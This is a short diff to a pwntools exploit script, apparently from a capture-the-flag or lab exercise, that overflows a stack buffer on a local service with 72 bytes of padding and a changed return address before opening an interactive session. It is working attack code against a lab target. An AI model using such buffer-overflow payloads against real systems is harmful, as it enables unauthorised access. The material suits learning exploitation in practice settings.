@@ -6,7 +6,7 @@ context.log_level = 'DEBUG'
 p = remote("localhost", 5001)
 
 junk = "A"*72
-payload = junk + p64(0x00401176)
+payload = junk + p64(0x00401196)
 
 p.sendline(payload)
 p.interactive()
